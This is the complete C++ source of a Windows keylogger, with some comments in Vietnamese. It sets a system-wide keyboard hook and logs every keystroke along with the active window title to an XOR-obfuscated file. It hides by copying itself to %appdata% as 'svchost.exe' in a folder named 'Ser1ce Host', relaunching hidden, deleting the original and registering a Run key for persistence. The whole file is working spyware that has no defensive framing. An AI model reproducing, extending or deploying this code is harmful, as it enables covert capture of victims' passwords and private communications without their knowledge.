// Keylogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <thread>
#include <windows.h>
#include <string.h>
#include <string>
#include <fstream>
#include <map>
#include <iterator>
#include <utility>
#include <chrono>

#define BUFSIZE 1000

typedef std::pair<std::string, std::string> keypair;

//---------------------------------------------
std::fstream FILELOG;
std::map<int, keypair> keyS;
std::map<int, std::string> keyO;

HHOOK hHook;
std::wstring m_file;
std::wstring m_dir;
WCHAR m_log[BUFSIZE];


//--------------------------------------------

void initKey();
void init();
void getfiletime();
std::wstring getTime();
std::wstring Encrypt(std::wstring);
void writeToFile(std::wstring);
void writeTitle();
void writeLog(std::string str);
void AutoStart();
LRESULT CALLBACK KeyProc(int Code, WPARAM wParam, LPARAM lParam);
bool Install();
void InstallHook();




int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
    // Get argv 
    LPWSTR* argv;
    int argc;
    argv = CommandLineToArgvW(GetCommandLine(), &argc);
    if (argc > 1)
    {
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
        _wremove(argv[1]);
    }


    init();
    if (!Install())
    {
        return 0;
    }

    AutoStart();
    InstallHook();
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) != 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hHook);
    return 0;
}


void initKey()
{
    // key có 2 trạng thái
    keyS[0x30] = { "0",")" };
    keyS[0x31] = { "1","!" };
    keyS[0x32] = { "2","@" };
    keyS[0x33] = { "3","#" };
    keyS[0x34] = { "4","$" };
    keyS[0x35] = { "5","%" };
    keyS[0x36] = { "6","^" };
    keyS[0x37] = { "7","&" };
    keyS[0x38] = { "8","*" };
    keyS[0x39] = { "9","(" };
    keyS[0xBA] = { ";",":" };
    keyS[0xBB] = { "=","+" };
    keyS[0xBC] = { ",","<" };
    keyS[0xBD] = { "-","_" };
    keyS[0xBE] = { ".",">" };
    keyS[0xBF] = { "/","?" };
    keyS[0xC0] = { "`","~" };
    keyS[0xDB] = { "[","{" };
    keyS[0xDC] = { "\\","|" };
    keyS[0xDD] = { "]","}" };
    keyS[0xDE] = { "'","\"" };
    for (int i = 0x41; i <= 0x5A; ++i)
    {
        keyS.insert(std::pair<int, keypair>(i, keypair(std::string(1, static_cast<char>(i + 0x20)), std::string(1, static_cast<char>(i)))));
    }

    // Key 1 trạng thái
    for (int i = 0x60; i <= 0x69; ++i)
    {
        keyO.insert({ i,std::to_string(i - 0x60) });
    }

    for (int i = VK_F1; i <= VK_F24; ++i)
    {
        keyO.insert({ i,"[F" + std::to_string(i - VK_F1 + 1) + "]" });
    }

    keyO[VK_NUMLOCK] = "[NUMLOCK]";
    keyO[VK_SCROLL] = "[SCROLLLOCK]";
    keyO[VK_SHIFT] = "[SHIFT]";
    keyO[VK_CONTROL] = "[CONTROL]";
    keyO[VK_LCONTROL] = "[LEFT CONTROL]";
    keyO[VK_RCONTROL] = "[RIGHT CONTROL]";
    keyO[VK_LSHIFT] = "[LEFT SHIFT]";
    keyO[VK_RSHIFT] = "[RIGHT SHIFT]";
    keyO[VK_LMENU] = "[LEFT ALT]";
    keyO[VK_RMENU] = "[RIGHT ALT]";
    keyO[VK_MENU] = "[ALT]";
    keyO[VK_CANCEL] = "[CANCEL]";
    keyO[VK_APPS] = "[APP]";
    keyO[VK_LWIN] = "[LEFT WINDOWS]";
    keyO[VK_RWIN] = "[RIGHT WINDOWS]";
    keyO[VK_BACK] = "[BACK SPACE]";
    keyO[VK_TAB] = "[TAB]";
    keyO[VK_RETURN] = "[ENTER]\n";
    keyO[VK_PAUSE] = "[PAUSE]";
    keyO[VK_CAPITAL] = "[CAPS LOCK]";
    keyO[VK_ESCAPE] = "[ESC]";
    keyO[VK_SPACE] = " ";
    keyO[VK_PRIOR] = "[PAGE UP]";
    keyO[VK_NEXT] = "[PAGE DOWN]";
    keyO[VK_END] = "[END]";
    keyO[VK_HOME] = "[HOME]";
    keyO[VK_LEFT] = "[LEFT ARROW]";
    keyO[VK_UP] = "[UP ARROW]";
    keyO[VK_RIGHT] = "[RIGHT ARROW]";
    keyO[VK_DOWN] = "[DOWN ARROW]";
    keyO[VK_SELECT] = "[SELECT]";
    keyO[VK_PRINT] = "[PRINT]";
    keyO[VK_EXECUTE] = "[EXECUTE]";
    keyO[VK_SNAPSHOT] = "[PRINT SCREEN]";
    keyO[VK_INSERT] = "[INS]";
    keyO[VK_DELETE] = "[DEL]";
    keyO[VK_HELP] = "[HELP]";
    keyO[VK_SLEEP] = "[SLEEP]";
    keyO[VK_MULTIPLY] = "*";
    keyO[VK_ADD] = "+";
    keyO[VK_SEPARATOR] = "Separator";
    keyO[VK_SUBTRACT] = "-";
    keyO[VK_DECIMAL] = ".";
    keyO[VK_DIVIDE] = "/";
    keyO[VK_BROWSER_BACK] = "[BROWSER BACK]";
    keyO[VK_BROWSER_FORWARD] = "[BROWSER FORWARD]";
    keyO[VK_BROWSER_REFRESH] = "[BROWSER REFRESH]";
    keyO[VK_BROWSER_STOP] = "[BROWSER STOP]";
    keyO[VK_BROWSER_SEARCH] = "[BROWSER SEARCH]";
    keyO[VK_BROWSER_FAVORITES] = "[BROWSER FAVORITES]";
    keyO[VK_BROWSER_HOME] = "[BROWSER HOME]";
    keyO[VK_VOLUME_MUTE] = "[VOLUME MUTE]";
    keyO[VK_VOLUME_DOWN] = "[VOLUME DOWN]";
    keyO[VK_VOLUME_UP] = "[VOLUME UP]";
    keyO[VK_MEDIA_NEXT_TRACK] = "[NEXT TRACK]";
    keyO[VK_MEDIA_PREV_TRACK] = "[PREV TRACK]";
    keyO[VK_MEDIA_STOP] = "[MEDIA STOP]";
    keyO[VK_MEDIA_PLAY_PAUSE] = "[MEDIA PLAY PAUSE]";
    keyO[VK_PACKET] = "[VK_PACKET]";
}

void init()
{
    initKey();

    WCHAR buf[BUFSIZE];
    GetEnvironmentVariable(L"appdata", buf, BUFSIZE);

    // m_dir = %appdata%\Ser1ce Host

    m_dir = std::wstring(buf) + L"\\Ser1ce Host\\";

    // m_file = %appdata%\Ser1ce Host\svchost.exe
    m_file = m_dir + L"svchost.exe";

    // Tạo thư mục Ser1ce Host
    CreateDirectory(m_dir.c_str(), NULL);

    // Tạo file log
    getfiletime();
    
}

void getfiletime()
{
    SYSTEMTIME systime;
    GetLocalTime(&systime);
    wsprintf(m_log, L"%s%02d%02d%d-%02d%02d%02d.dat",m_dir.c_str(), systime.wDay, systime.wMonth, systime.wYear, systime.wHour, systime.wMinute, systime.wSecond);
}

std::wstring getTime()
{
    SYSTEMTIME systime;
    GetLocalTime(&systime);
    WCHAR buf[BUFSIZE];
    memset(buf, 0, sizeof(buf));
    wsprintf(buf, L"\r\n\n%02d/%02d/%d %02d:%02d:%02d - [",systime.wDay,systime.wMonth,systime.wYear, systime.wHour, systime.wMinute, systime.wSecond);
    return buf;
}

std::wstring Encrypt(std::wstring str)
{
    std::wstring res = L"";
    for(int i = 0;i<str.length();++i)
    {
        res += (WCHAR)str[i]^0x4242;
    }
    return res;
}

void writeToFile(std::wstring str)
{
    DWORD dwBytesWritten;
    std::wstring s = Encrypt(str);
    HANDLE hFile = CreateFile(m_log, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(hFile, s.c_str(), s.length()*sizeof(WCHAR), &dwBytesWritten, NULL);
    CloseHandle(hFile);
}

void writeTitle()
{
    static WCHAR wnd_title[BUFSIZE];
    static WCHAR wnd_prevtitle[BUFSIZE];
    memset(wnd_title, 0, sizeof(wnd_title));
    HWND hwnd = GetForegroundWindow();
    GetWindowText(hwnd, wnd_title, sizeof(wnd_title));
    if (wcscmp(wnd_prevtitle, wnd_title) != 0)
    {
        wcscpy_s(wnd_prevtitle, sizeof(wnd_prevtitle), wnd_title);
        writeToFile(getTime());
        writeToFile(wnd_title);
        writeToFile(L"]\n");
    }
}

void writeLog(std::string str)
{
    writeTitle();
    std::wstring wstr(str.begin(), str.end());
    writeToFile(wstr);
}

void AutoStart()
{
    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueEx(hKey, L"Serv1ce Host", 0, REG_SZ, (BYTE*)m_file.c_str(), m_file.length()*sizeof(WCHAR));
    RegCloseKey(hKey);
}

LRESULT CALLBACK KeyProc(int Code, WPARAM wParam, LPARAM lParam)
{
    KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
    DWORD vkCode;
    switch (wParam)
    {
    case WM_KEYDOWN:
        vkCode = pKey->vkCode;
        // 
        if (GetAsyncKeyState(VK_SHIFT))
        {
            for (std::map<int, keypair>::iterator it = keyS.begin(); it != keyS.end(); it++)
            {
                if (it->first == vkCode)
                {
                    if(GetKeyState(VK_CAPITAL) && it->first >= 0x41 && it->first <=0x5A)
                        writeLog(it->second.first);
                    else 
                        writeLog(it->second.second);
                }
            }          
        }
        else
        {
            for (std::map<int, keypair>::iterator it = keyS.begin(); it != keyS.end(); it++)
            {
                if (it->first == vkCode)
                {
                    if (GetKeyState(VK_CAPITAL) && it->first >= 0x41 && it->first <= 0x5A)
                        writeLog(it->second.second);
                    else
                        writeLog(it->second.first);
                }
            }
        }
        

        for (std::map<int, std::string>::iterator it = keyO.begin(); it != keyO.end(); ++it)
        {
            if (it->first == vkCode)
            {
                writeLog(it->second);
            }
        }
        break;

    case WM_SYSKEYDOWN:
        vkCode = pKey->vkCode;
        for (std::map<int, std::string>::iterator it = keyO.begin(); it != keyO.end(); ++it)
        {
            if (it->first == vkCode)
            {
                writeLog(it->second);
            }
        }
        break;
    default:
        return CallNextHookEx(NULL, Code, wParam, lParam);
    }
    return 0;
}

bool Install()
{
    HMODULE hModule = GetModuleHandle(NULL);
    WCHAR filename[BUFSIZE];
    memset(filename, 0, sizeof(filename));
    GetModuleFileName(hModule, filename, sizeof(filename));

    if (wcscmp(filename, m_file.c_str()))
    {
        // Copy file và thực thi file mới
        CopyFile(filename, m_file.c_str(), FALSE);
        WCHAR cmdl[BUFSIZE];
        memset(cmdl, 0, sizeof(cmdl));
        wsprintf(cmdl,L"\"%s\"", filename);
  
        ShellExecute(NULL, L"open", m_file.c_str(), cmdl, NULL, SW_HIDE);
        return false;
    }


    return true;
}

void InstallHook()
{
    
    HINSTANCE hModule = GetModuleHandle(NULL);
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyProc, hModule, 0);
}


